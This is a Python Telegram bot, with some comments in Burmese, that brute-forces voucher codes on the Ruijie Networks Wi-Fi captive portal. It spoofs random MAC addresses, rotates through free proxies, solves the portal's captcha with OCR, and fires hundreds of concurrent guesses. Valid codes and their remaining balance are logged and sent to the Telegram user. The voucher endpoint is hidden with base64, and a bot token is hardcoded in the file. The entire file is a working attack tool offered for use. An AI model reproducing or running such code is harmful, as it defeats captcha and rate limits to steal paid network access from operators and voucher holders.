#!/usr/bin/env python3
import os
import sys
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
from datetime import datetime

try:
    import cv2
    import numpy as np
    import ddddocr
except ImportError as e:
    print(f"Missing required library: {e}. Please install: pip install opencv-python numpy ddddocr aiohttp python-telegram-bot")
    sys.exit(1)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.error import RetryAfter, TimedOut, NetworkError
import logging

# ── Disable Telegram logs ──────────────────────────────────────────
logging.basicConfig(level=logging.ERROR)

# ─── CONFIG ──────────────────────────────────────────────────────────
BOT_TOKEN = "8876310492:AAFHXTHionY2RIDse381QH5SdZlFCT7V1h4"  # ⚠️ ENV variable ကနေပဲ ဖတ်ပါ — code ထဲ ထည့်မထားပါ
PROXY_FILE = "free-proxy-list.txt"
MAX_CONCURRENT = 500
BATCH_SIZE = 1000
REQUEST_TIMEOUT = 8
CAPTCHA_RETRIES = 2
PROXY_FAIL_LIMIT = 3

# ─── GLOBALS ──────────────────────────────────────────────────────────
user_data = {}    # {chat_id: {"url": "..."}}
scan_tasks = {}   # {chat_id: asyncio.Task}
scan_stats = {}   # {chat_id: {...}}

proxy_list = []
proxy_stats = {}
proxy_fail_lock = asyncio.Lock()
proxy_index = 0
proxy_lock = asyncio.Lock()

# OCR
_ocr = ddddocr.DdddOcr(show_ad=False)

# ─── TERMINAL COLORS ────────────────────────────────────────────────
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
END = '\033[0m'

# ─── PROXY ROTATOR ──────────────────────────────────────────────────

def load_proxies():
    """Load ONLY HTTP proxies from free-proxy-list.txt"""
    global proxy_list, proxy_stats
    if not os.path.exists(PROXY_FILE):
        print(f"{RED}❌ {PROXY_FILE} not found!{END}")
        return False

    with open(PROXY_FILE, 'r') as f:
        raw_proxies = [line.strip() for line in f if line.strip()]

    proxy_list = [p for p in raw_proxies if p.startswith('http://')]

    if not proxy_list:
        print(f"{RED}❌ No HTTP proxies found in {PROXY_FILE}{END}")
        print(f"{YELLOW}⚠️ Total lines: {len(raw_proxies)}, HTTP proxies found: 0{END}")
        print(f"{YELLOW}💡 Make sure your proxies start with 'http://' not 'socks5://' or 'socks4://'{END}")
        return False

    for p in proxy_list:
        proxy_stats[p] = {"fail_count": 0}

    print(f"{GREEN}✅ Loaded {len(proxy_list)} HTTP proxies from {PROXY_FILE}{END}")
    print(f"{YELLOW}📊 Total lines: {len(raw_proxies)}, HTTP: {len(proxy_list)}, Other: {len(raw_proxies) - len(proxy_list)}{END}")
    return True

async def get_next_proxy():
    global proxy_index
    async with proxy_lock:
        if not proxy_list:
            return None
        attempts = 0
        while attempts < len(proxy_list):
            proxy = proxy_list[proxy_index % len(proxy_list)]
            proxy_index += 1
            attempts += 1
            stats = proxy_stats.get(proxy, {"fail_count": 0})
            if stats["fail_count"] < PROXY_FAIL_LIMIT:
                return proxy
        # All failed → reset
        for p in proxy_list:
            proxy_stats[p]["fail_count"] = 0
        return proxy_list[0]

async def mark_proxy_fail(proxy):
    async with proxy_fail_lock:
        if proxy in proxy_stats:
            proxy_stats[proxy]["fail_count"] += 1

async def mark_proxy_success(proxy):
    async with proxy_fail_lock:
        if proxy in proxy_stats:
            proxy_stats[proxy]["fail_count"] = 0

# ─── HELPER FUNCTIONS ──────────────────────────────────────────────

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def format_time(seconds):
    if seconds <= 0:
        return "0s"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

def minutes_to_display(minutes):
    if minutes == float('inf') or minutes >= 999999:
        return "Unlimited"
    if minutes <= 0:
        return "Expired"
    total_secs = minutes * 60
    if total_secs > 86400:
        days = int(total_secs / 86400)
        hours = int((total_secs % 86400) / 3600)
        mins = int((total_secs % 3600) / 60)
        return f"{days}d {hours}h {mins}m"
    elif total_secs > 3600:
        hours = int(total_secs / 3600)
        mins = int((total_secs % 3600) / 60)
        return f"{hours}h {mins}m"
    elif total_secs > 60:
        return f"{int(minutes)}m"
    else:
        return f"{int(total_secs)}s"

# ─── OCR & CAPTCHA ──────────────────────────────────────────────────

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

async def ocr_text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

# ─── NETWORK REQUESTS ──────────────────────────────────────────────

async def get_session_id(session, url, proxy):
    mac = get_mac()
    url = replace_mac(url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html',
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True, proxy=proxy, timeout=REQUEST_TIMEOUT) as resp:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(resp.url))
            return sid.group(1) if sid else None
    except Exception:
        return None

async def fetch_captcha(session, session_id, proxy):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers, proxy=proxy, timeout=REQUEST_TIMEOUT
        ) as resp:
            return await resp.read()
    except Exception:
        return None

async def verify_captcha(session, session_id, text, proxy):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'content-type': 'application/json'
    }
    try:
        async with session.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json=json_data, proxy=proxy, timeout=REQUEST_TIMEOUT
        ) as resp:
            data = await resp.json()
            return data.get("success", False)
    except Exception:
        return False

async def post_voucher(session, session_id, code, captcha_text, proxy):
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    data = {
        "accessCode": code,
        "sessionId": session_id,
        "apiVersion": 1,
        "authCode": captcha_text,
    }
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
        "content-type": "application/json",
        "accept": "*/*",
    }
    try:
        async with session.post(
            post_url, json=data, headers=headers, proxy=proxy, timeout=REQUEST_TIMEOUT
        ) as resp:
            text = await resp.text()
            # ⚠️ 'STA' က broad ဖြစ်လို့ quotes နဲ့ တိကျအောင် စစ်ပါ
            if 'logonUrl' in text:
                return "HIT"
            elif '"STA"' in text or 'stationNum' in text or 'already online' in text.lower():
                return "LIMIT"
            else:
                return "EXPIRED"
    except Exception:
        return "EXPIRED"

async def fetch_balance(session, session_id, proxy):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'application/json'
    }
    for url in endpoints:
        try:
            async with session.get(url, headers=headers, proxy=proxy, timeout=REQUEST_TIMEOUT) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                if not data.get("success", False):
                    continue
                result = data.get("result", {}) or data.get("data", {})
                minutes = None
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes',
                            'leftMinutes', 'balance', 'remaining']:
                    if key in result and result[key] is not None:
                        minutes = result[key]
                        break
                if minutes is None:
                    continue
                plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                return plan_name, minutes
        except Exception:
            continue
    return "Unknown", 0

# ─── CODE GENERATORS ──────────────────────────────────────────────

def iter_digit_codes(mode, start_digit=None):
    """
    ✅ O(1) memory generator — list ဆောက်မထားတော့ဘူး
    ✅ 9-digit အတွက် range မှန်သွားပြီ (0 ~ 999,999,999)
    """
    length = int(mode)

    if start_digit is not None and mode in ["6", "7"]:
        start = int(start_digit) * (10 ** (length - 1))
        end = (int(start_digit) + 1) * (10 ** (length - 1))
    else:
        start = 0
        end = 10 ** length

    span = end - start
    if span <= 0:
        return

    # Random offset နဲ့ iterate → shuffle effect ရပေမယ့် memory O(1)
    offset = random.randint(0, span - 1)
    for i in range(span):
        yield str(start + (i + offset) % span).zfill(length)

def iter_mixed(length=6, max_seen=500000):
    """Random mixed alphanumeric — seen set ကို limit ထားပြီး memory ထိန်း"""
    chars = string.ascii_lowercase + string.digits
    seen = set()
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code in seen:
            continue
        if len(seen) >= max_seen:
            seen.clear()
        seen.add(code)
        yield code

def iter_lowercase(length=6, max_seen=500000):
    chars = string.ascii_lowercase
    seen = set()
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code in seen:
            continue
        if len(seen) >= max_seen:
            seen.clear()
        seen.add(code)
        yield code

def iter_codes(mode, start_digit=None):
    if mode.startswith("mixed"):
        length = int(mode.replace("mixed", ""))
        return iter_mixed(length)
    elif mode.startswith("lower"):
        length = int(mode.replace("lower", ""))
        return iter_lowercase(length)
    elif mode in ["6", "7", "8", "9"]:
        return iter_digit_codes(mode, start_digit)
    else:
        raise ValueError(f"Unsupported mode: {mode}")

# ─── SCANNER WORKER ──────────────────────────────────────────────

async def scan_worker(code, semaphore, chat_id):
    stats = scan_stats.get(chat_id)
    if not stats:
        return

    async with semaphore:
        # ✅ semaphore ရပြီးမှ current_code သတ်မှတ် — display မှန်သွားပြီ
        stats["current_code"] = code

        proxy = await get_next_proxy()
        if not proxy:
            return

        session_url = user_data.get(chat_id, {}).get("url")
        if not session_url:
            return

        try:
            async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
                session_id = await get_session_id(session, session_url, proxy)
                if not session_id:
                    await mark_proxy_fail(proxy)
                    stats["expired"] += 1
                    return

                captcha_solved = False
                text = None
                for _ in range(CAPTCHA_RETRIES):
                    img = await fetch_captcha(session, session_id, proxy)
                    if not img:
                        continue
                    text = await ocr_text(img)
                    if not text:
                        continue
                    if await verify_captcha(session, session_id, text, proxy):
                        captcha_solved = True
                        break

                if not captcha_solved or not text:
                    await mark_proxy_fail(proxy)
                    stats["expired"] += 1
                    return

                await mark_proxy_success(proxy)
                result = await post_voucher(session, session_id, code, text, proxy)

                if result == "HIT":
                    plan, minutes = await fetch_balance(session, session_id, proxy)
                    display_time = minutes_to_display(minutes)
                    hit_info = {
                        "code": code,
                        "plan": plan,
                        "balance": display_time,
                        "minutes": minutes,
                    }
                    stats["found"].append(hit_info)
                    stats["hits"] += 1

                    filename = f"hits_{chat_id}.txt"
                    try:
                        with open(filename, "a", encoding="utf-8") as f:
                            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                                    f"HIT: {code} | {plan} | {display_time}\n")
                    except Exception:
                        pass

                elif result == "LIMIT":
                    stats["limits"] += 1
                else:
                    stats["expired"] += 1

        except asyncio.CancelledError:
            raise
        except Exception:
            await mark_proxy_fail(proxy)
            stats["expired"] += 1

# ─── BOT SCANNER LOOP ──────────────────────────────────────────────

def build_status_text(stats, extra_header=None):
    elapsed = time.time() - stats["start_time"]
    speed = (stats["tried"] / elapsed * 60) if elapsed > 0 else 0
    text = extra_header or ""
    text += (
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏹 Tried: `{stats['tried']:,}`\n"
        f"🎯 Current: `{stats['current_code']}`\n"
        f"🔥 Hits: `{stats['hits']}`\n"
        f"⚔️ Expired: `{stats['expired']}`\n"
        f"⚠️ Limits: `{stats['limits']}`\n"
        f"⚡ Speed: `{speed:.1f}` c/m\n"
        f"⏱ Time: `{format_time(elapsed)}`\n"
        f"🔀 Proxies: `{len(proxy_list)}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    found = stats.get("found", [])
    if found:
        text += "🔥 **Found Codes:**\n"
        for item in found[-5:]:
            text += f"`{item['code']}` 🃏: {item['plan']}, ⏰: {item['balance']}\n"
    else:
        text += "📭 No hits yet..."
    return text

async def safe_edit(context, chat_id, message_id, text, **kwargs):
    """RetryAfter / network error ကို handle လုပ်တဲ့ edit helper"""
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=message_id, text=text, **kwargs
        )
        return True
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        return False
    except (TimedOut, NetworkError):
        return False
    except Exception:
        return False

async def run_bot_scanner(chat_id, mode, start_digit, context: ContextTypes.DEFAULT_TYPE):
    if chat_id not in scan_stats:
        scan_stats[chat_id] = {
            "tried": 0,
            "hits": 0,
            "expired": 0,
            "limits": 0,
            "current_code": "N/A",
            "start_time": time.time(),
            "found": [],
            "stop_flag": False,
        }
    stats = scan_stats[chat_id]
    stats["start_time"] = time.time()
    stats["stop_flag"] = False

    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    try:
        code_gen = iter_codes(mode, start_digit)
    except ValueError as e:
        await context.bot.send_message(chat_id, f"❌ {str(e)}")
        return

    progress_msg = await context.bot.send_message(chat_id, "🔄 Initializing scan...")
    last_update = time.time()

    try:
        while not stats["stop_flag"]:
            batch_tasks = []
            for _ in range(BATCH_SIZE):
                try:
                    code = next(code_gen)
                except StopIteration:
                    stats["stop_flag"] = True
                    break
                except Exception:
                    stats["stop_flag"] = True
                    break
                batch_tasks.append(scan_worker(code, semaphore, chat_id))
                stats["tried"] += 1

            if not batch_tasks:
                break

            await asyncio.gather(*batch_tasks, return_exceptions=True)

            if time.time() - last_update > 2.0:
                text = build_status_text(stats, extra_header="⚡ **Scanner Running** ⚡\n")
                await safe_edit(
                    context, chat_id, progress_msg.message_id, text,
                    parse_mode='Markdown'
                )
                last_update = time.time()

            await asyncio.sleep(0.05)

    except asyncio.CancelledError:
        stats["stop_flag"] = True

    finally:
        elapsed = time.time() - stats["start_time"]
        speed = (stats["tried"] / elapsed * 60) if elapsed > 0 else 0
        found_codes = stats["found"]

        final_text = (
            f"✅ **Scan Finished**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🏹 Tried: `{stats['tried']:,}`\n"
            f"🔥 Hits: `{stats['hits']}`\n"
            f"⚔️ Expired: `{stats['expired']}`\n"
            f"⚠️ Limits: `{stats['limits']}`\n"
            f"⚡ Speed: `{speed:.1f}` c/m\n"
            f"⏱ Time: `{format_time(elapsed)}`\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )

        if found_codes:
            final_text += f"🔥 **Found Codes ({len(found_codes)})**:\n"
            for item in found_codes:
                final_text += f"`{item['code']}` 🃏: {item['plan']}, ⏰: {item['balance']}\n"

            filename = f"hits_{chat_id}.txt"
            if os.path.exists(filename):
                try:
                    with open(filename, "rb") as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=f,
                            caption=f"📁 Found {len(found_codes)} codes."
                        )
                except Exception as e:
                    print(f"File send error: {e}")
        else:
            final_text += "📭 No codes found."

        ok = await safe_edit(
            context, chat_id, progress_msg.message_id, final_text,
            parse_mode='Markdown'
        )
        if not ok:
            try:
                await context.bot.send_message(chat_id, final_text, parse_mode='Markdown')
            except Exception:
                pass

        # Cleanup
        scan_tasks.pop(chat_id, None)
        scan_stats.pop(chat_id, None)

# ─── TELEGRAM BOT HANDLERS ──────────────────────────────────────────

def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔢 6 Digits", callback_data="mode_6"),
         InlineKeyboardButton("🔢 7 Digits", callback_data="mode_7")],
        [InlineKeyboardButton("🔢 8 Digits", callback_data="mode_8"),
         InlineKeyboardButton("🔢 9 Digits", callback_data="mode_9")],
        [InlineKeyboardButton("🔤 Mixed 6", callback_data="mode_mixed6"),
         InlineKeyboardButton("🔤 Mixed 7", callback_data="mode_mixed7")],
        [InlineKeyboardButton("🔤 Mixed 8", callback_data="mode_mixed8"),
         InlineKeyboardButton("🔤 Mixed 9", callback_data="mode_mixed9")],
        [InlineKeyboardButton("🔡 Lowercase 6", callback_data="mode_lower6")],
        [InlineKeyboardButton("⏹ Stop Scan", callback_data="stop_scan"),
         InlineKeyboardButton("📊 Status", callback_data="status")],
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    await context.bot.send_message(
        chat_id=chat_id,
        text="🤖 **STLINK Scanner Bot**\n\n"
             "အောက်ပါအတိုင်း သုံးပါ။\n\n"
             "1️⃣ `/seturl <portal_url>` နဲ့ URL ထည့်ပါ။\n"
             "2️⃣ Scan Mode ကို အောက်က ခလုတ်မှ ရွေးပါ။\n"
             "3️⃣ `/stop` နဲ့ ရပ်တန့်နိုင်ပါတယ်။\n\n"
             f"🔗 **Proxies Loaded:** `{len(proxy_list)}`",
        reply_markup=get_main_keyboard(),
        parse_mode='Markdown'
    )

async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ URL ထည့်ပါ။\n`/seturl https://portal-as.ruijienetworks.com/...?mac=xx`",
            parse_mode='Markdown'
        )
        return
    url = args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid URL.")
        return

    user_data.setdefault(chat_id, {})["url"] = url
    await update.message.reply_text(
        f"✅ URL Set Successfully!\n\n`{url[:80]}...`",
        parse_mode='Markdown'
    )

async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if not args:
        await update.message.reply_text(
            "Usage: `/scan <mode> [start_digit]`\nExample: `/scan 6 5` or `/scan mixed6`",
            parse_mode='Markdown'
        )
        return

    mode = args[0]
    start_digit = args[1] if len(args) > 1 else None

    if chat_id not in user_data or "url" not in user_data[chat_id]:
        await update.message.reply_text("❌ URL မထည့်ရသေးပါ။ `/seturl` နဲ့ အရင်ထည့်ပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id].done():
        await update.message.reply_text("⚠️ Scan လုပ်နေပြီးသားပါ။ `/stop` နဲ့ရပ်ပါ။")
        return

    if mode not in ["6", "7", "8", "9", "mixed6", "mixed7", "mixed8", "mixed9", "lower6"]:
        await update.message.reply_text(
            "❌ Invalid mode. Choose: 6,7,8,9,mixed6,mixed7,mixed8,mixed9,lower6"
        )
        return

    if start_digit is not None:
        if mode not in ["6", "7"] or not start_digit.isdigit() or not (0 <= int(start_digit) <= 9):
            await update.message.reply_text("❌ Start digit must be 0-9 for 6/7 modes only.")
            return

    await update.message.reply_text(
        f"🚀 Starting scan!\nMode: `{mode}` | Start: `{start_digit or 'Random'}`",
        parse_mode='Markdown'
    )

    task = asyncio.create_task(run_bot_scanner(chat_id, mode, start_digit, context))
    scan_tasks[chat_id] = task

async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in scan_tasks and not scan_tasks[chat_id].done():
        if chat_id in scan_stats:
            scan_stats[chat_id]["stop_flag"] = True
        scan_tasks[chat_id].cancel()
        await update.message.reply_text("⏹ Scan stopped successfully!")
    else:
        await update.message.reply_text("⚠️ No scan is currently running.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in scan_stats:
        await update.message.reply_text("📊 No scan running.")
        return

    stats = scan_stats[chat_id]
    text = build_status_text(stats, extra_header="📊 **Scan Status**\n")
    await update.message.reply_text(text, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    data = query.data

    # ── STOP ──
    if data == "stop_scan":
        if chat_id in scan_tasks and not scan_tasks[chat_id].done():
            if chat_id in scan_stats:
                scan_stats[chat_id]["stop_flag"] = True
            scan_tasks[chat_id].cancel()
            try:
                await query.edit_message_text(
                    "⏹ Scan stopped!",
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
        else:
            try:
                await query.edit_message_text(
                    "⚠️ No scan running.",
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
        return

    # ── STATUS ──
    if data == "status":
        if chat_id not in scan_stats:
            try:
                await query.edit_message_text(
                    "📊 No scan running.",
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
            return
        stats = scan_stats[chat_id]
        text = build_status_text(stats, extra_header="📊 **Scan Status**\n")
        try:
            await query.edit_message_text(
                text, parse_mode='Markdown', reply_markup=get_main_keyboard()
            )
        except Exception:
            pass
        return

    # ── MODE SELECT ──
    if data.startswith("mode_"):
        mode = data.replace("mode_", "")

        # 6/7 digit → user က start_digit ရွေးရဦးမယ်
        if mode in ["6", "7"]:
            try:
                await query.edit_message_text(
                    f"🔢 Mode `{mode}` selected.\n\n"
                    f"Start digit ထည့်ရန် `/scan {mode} <0-9>` ကိုသုံးပါ။\n"
                    f"ဥပမာ: `/scan {mode} 5`",
                    parse_mode='Markdown',
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
            return

        # URL check
        if chat_id not in user_data or "url" not in user_data[chat_id]:
            try:
                await query.edit_message_text(
                    "❌ URL မထည့်ရသေးပါ။ `/seturl` နဲ့ အရင်ထည့်ပါ။",
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
            return

        # Already running?
        if chat_id in scan_tasks and not scan_tasks[chat_id].done():
            try:
                await query.edit_message_text(
                    "⚠️ Scan လုပ်နေပြီးသားပါ။ `/stop` နဲ့ရပ်ပါ။",
                    reply_markup=get_main_keyboard()
                )
            except Exception:
                pass
            return

        try:
            await query.edit_message_text(
                f"🚀 Starting scan! Mode: `{mode}`",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard()
            )
        except Exception:
            pass

        task = asyncio.create_task(run_bot_scanner(chat_id, mode, None, context))
        scan_tasks[chat_id] = task

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # General messages — currently ignored
    pass

# ─── MAIN ──────────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        print(f"{RED}❌ BOT_TOKEN environment variable is not set!{END}")
        print(f"{YELLOW}💡 Export it: export BOT_TOKEN='123456:ABC...'{END}")
        return

    if not load_proxies():
        print(f"{RED}❌ Proxy loading failed. Exiting.{END}")
        return

    print(f"{GREEN}🤖 Starting Telegram Bot Scanner...{END}")
    print(f"{GREEN}🔗 HTTP Proxies loaded: {len(proxy_list)}{END}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("seturl", seturl))
    app.add_handler(CommandHandler("scan", scan_command))
    app.add_handler(CommandHandler("stop", stop_scan))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print(f"{GREEN}✅ Bot is polling...{END}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
